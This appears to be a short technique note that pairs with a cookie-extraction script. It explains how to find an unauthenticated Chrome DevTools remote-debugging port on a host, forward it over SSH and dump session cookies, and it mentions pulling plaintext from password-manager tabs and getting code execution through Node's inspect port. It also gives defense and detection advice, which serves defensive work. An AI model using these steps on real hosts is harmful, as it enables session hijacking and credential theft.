# Chrome remote-debugging = a logged-in browser

Full writeup: [jperezduerto.info/techniques/chrome-remote-debug-session-theft](https://jperezduerto.info/techniques/chrome-remote-debug-session-theft/)

An unexplained high loopback port on a host with test automation is often
Chrome's DevTools remote-debugging interface, which has no authentication. Its
only control is loopback binding, which stops nobody with a shell. Forward it
and read the session cookies of whatever the automated browser logs into
(usually a more privileged app user), and sometimes plaintext from the DOM.
`chrome-cookies.py` dumps cookies over the DevTools websocket (read-only).

## Find

```bash
ss -tlnp | grep 127.0.0.1
ps aux | grep -iE "chrome|chromedriver|selenium|puppeteer|playwright"   # --remote-debugging-port
```

## Talk to it

```bash
ssh -L 9222:localhost:<PORT> user@target
curl -s http://localhost:9222/json/list          # no auth; names the open tabs
python3 chrome-cookies.py http://localhost:9222   # Network.getAllCookies
```

Take the automation's session cookie, forward the app's port, load it as that
user. Password-manager/vault tabs have plaintext in the DOM
(`Runtime.evaluate`). A Node `--inspect` port (9229) is RCE, not just cookies.

## Defense

Loopback is not access control once a local account exists. No
`--remote-debugging-port`/`--inspect` on shared or production hosts; if CI needs
it, use an ephemeral port in the job's own namespace and tear it down. Do not
run authenticated test automation on hosts untrusted users can shell into; give
the test account least privilege.

## Detection

A process with `--remote-debugging-port`/`--inspect` outside known CI; a
connection to that port from a non-test-runner PID; an `ssh -L` forward onto
9222/9229; an automation account's session used from a new IP or outside its
test window.

## Use

Authorized and educational use only. Run the extractor only against a debug port
you are authorized to access.
